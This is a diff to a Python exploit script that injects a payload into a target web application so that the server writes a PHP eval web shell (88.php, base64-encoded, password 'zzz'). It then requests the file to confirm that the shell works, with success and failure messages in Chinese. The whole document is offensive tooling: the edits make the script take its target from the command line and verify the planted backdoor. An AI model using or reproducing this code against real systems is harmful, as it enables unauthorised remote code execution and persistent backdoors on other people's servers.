@@ -1,5 +1,6 @@
 ﻿import requests
 import re
+import sys
 def get_url(url, user_agent):
  
     headers = {
@@ -31,9 +32,17 @@ def generate_payload(php_payload):
  
     return exploit_template
  
+def check(url):
+    response = requests.get(url)
+    return response.content
 
-turl = raw_input("URL:")
-syscmd = "file_put_contents(dirname($_SERVER['SCRIPT_FILENAME']).'/99.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+'));"
+
+turl = sys.argv[1]
+syscmd = "file_put_contents(dirname($_SERVER['SCRIPT_FILENAME']).'/88.php',base64_decode('dnZ2PD9waHAgZXZhbCgkX1BPU1Rbenp6XSk7Pz4='));"
 pl = generate_payload(syscmd)
 get_url(turl, pl)
-print u"如果成功shell为"+turl+u"99.php，密码为1"
+url = turl+'88.php'
+if 'vvv' in check(url):
+    print u"成功shell为"+turl+u"88.php，密码为zzz"
+else:
+    print u"失败！漏洞已修补或版本不同！"
